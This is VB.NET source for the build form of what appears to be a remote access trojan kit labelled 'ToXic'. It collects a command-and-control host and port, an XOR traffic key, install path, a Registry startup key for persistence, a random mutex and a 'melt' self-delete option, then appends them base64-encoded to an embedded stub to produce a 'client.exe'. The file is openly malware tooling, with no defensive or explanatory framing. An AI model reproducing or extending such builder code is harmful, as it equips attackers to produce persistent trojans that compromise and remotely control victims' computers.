﻿Imports System.IO
Imports System.Text
Public Class frmBuild
    Private Sub frmBuild_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        comboLocation.SelectedIndex = 0
        txtMutex.Text = "ToXic_MuTeX_" & get_mutex()
    End Sub

    Public Function get_mutex() As String
        'Static rnd As New Random()
        Dim rnd As New Random()
        Dim validchars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789_-$&=+?~!".ToCharArray()
        Dim mutex As String = ""
        For i As Integer = 0 To rnd.Next(10, 15)
            mutex += validchars(rnd.Next(0, validchars.Length))
        Next
        Return mutex
    End Function

    Private Sub chkDisplay_CheckedChanged(sender As Object, e As EventArgs) Handles chkDisplay.CheckedChanged
        If chkDisplay.Checked = True Then
            txtPassword.UseSystemPasswordChar = False
        Else
            txtPassword.UseSystemPasswordChar = True
        End If
    End Sub

    Private Sub btnGenerate_Click(sender As Object, e As EventArgs) Handles btnGenerate.Click
        txtMutex.Text = "ToXic_MuTeX_" & get_mutex()
    End Sub

    Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
        If String.IsNullOrEmpty(txtC2.Text) Then
            MessageBox.Show("You must specify a Dynamic DNS or endpoint IP address!", "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Warning)
        ElseIf String.IsNullOrEmpty(txtPassword.Text) Then
            MessageBox.Show("You must specify a password to encrypt your traffic!", "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Warning)
        ElseIf (chkFolder.Checked = True And String.IsNullOrEmpty(txtFolder.Text)) Then
            MessageBox.Show("You forgot the specify the name of your sub-folder!", "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Warning)
        ElseIf (chkStartup.Checked = True And String.IsNullOrEmpty(txtRegkey.Text)) Then
            MessageBox.Show("You forgot the specify the name of your Windows Registry start-up key!", "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Warning)
        ElseIf String.IsNullOrEmpty(txtMutex.Text) Then
            MessageBox.Show("You cannot leave your Mutual Exclusion string blank! The more random the better :)", "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Warning)
        Else

            Dim args As String

            '[Index: 0] C2 IP
            args += txtC2.Text & "|"

            '[Index: 1] C2 Port
            args += numPort.Value.ToString & "|"

            '[Index: 2] XOR Encrypion Key
            args += txtPassword.Text & "|"

            '[Index: 3] Install Location
            If chkInstall.Checked = True Then
                args += comboLocation.Text & "|"
            Else
                args += "0|"
            End If

            '[Index: 4] Install Sub-Folder
            If chkFolder.Checked = True Then
                args += txtFolder.Text & "|"
            Else
                args += "0|"
            End If

            '[Index: 5] Executable Name
            args += txtFilename.Text & "|"

            '[Index: 6] Registry Key
            If chkStartup.Checked = True Then
                args += txtRegkey.Text & "|"
            Else
                args += "0|"
            End If

            '[Index: 7] Process Mutex
            args += txtMutex.Text & "|"

            '[Index: 8] File Melt
            If chkMelt.Checked = True Then
                args += "1"
            Else
                args += "0"
            End If

            Dim _sfd As New SaveFileDialog

            _sfd.Filter = "Executable Files (*.exe)|*.exe"
            _sfd.InitialDirectory = Environment.SpecialFolder.Desktop
            _sfd.FileName = "client"

            If _sfd.ShowDialog = DialogResult.OK Then

                Try
                    Dim fs As String = "<FS>"
                    Dim buffer As Byte() = My.Resources.stub

                    Dim byteArray As Byte() = Encoding.UTF8.GetBytes(args)
                    Dim base64String As String = Convert.ToBase64String(byteArray)

                    'write stub content to disk
                    My.Computer.FileSystem.WriteAllBytes(_sfd.FileName, buffer, False)

                    File.AppendAllText(_sfd.FileName, fs & base64String)

                    MessageBox.Show("Operation complete!", "")
                Catch ex As Exception
                    MessageBox.Show(ex.Message, "")
                End Try

            End If

        End If
    End Sub
End Class